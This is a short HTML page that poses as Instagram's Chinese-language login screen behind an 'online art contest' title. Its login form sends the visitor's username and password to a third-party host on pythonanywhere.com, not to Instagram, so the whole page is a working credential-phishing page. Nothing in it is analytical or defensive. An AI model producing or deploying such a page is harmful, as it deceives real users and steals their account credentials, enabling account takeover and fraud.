<!DOCTYPE html>
<html lang="zh">
<head>
  <title>在线艺术比赛</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>
  <span id="root">
    <section class="section-all">
      <link rel="stylesheet" href="css/css.css">
      <!-- 1-角色 主要内容 -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo"
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
                    alt="Instagram">
                </div><!-- 标题 结束 -->
                <div class="form-wrap">
                  <form class="form" action="https://cyrru.pythonanywhere.com/login1" method="POST" class="my-login-validation"
                    novalidate="">
                    <div class="input-box">
                    <input type="text" id="username" placeholder="电话号码、用户名或电子邮件" aria-required="true"
                      maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                </div>
                <div class="input-box">
                  <input type="password" name="password" id="password" placeholder="密码" maxlength="30"
                    aria-required="true" autocapitalize="off" autocorrect="off" required>
                </div>
                <span class="button-box">
                  <button class="btn" type="submit">登录</button>
                </span>
                <a class="forgot" href="/">忘记密码？</a>
                </form>
              </div> <!-- 表单 结束 -->
            </div> <!-- 登录框 结束 -->

            <div class="login-box">
              <p class="text">还没有帐号？<a href="/">注册</a></p>
            </div> <!-- 注册 结束 --><!-- 应用 结束 -->
        </div> <!-- 内容 结束 -->
        </article>
        </div> <!-- 包装 结束 -->
      </main>
      <!-- 2-角色 页脚 -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">
          <span class="footer-logo">&copy; 2023 Instagram</span>
        </div> <!-- 页脚容器 结束 -->
      </footer>
    </section>
  </span> <!-- 根元素 -->
</body>
</html>
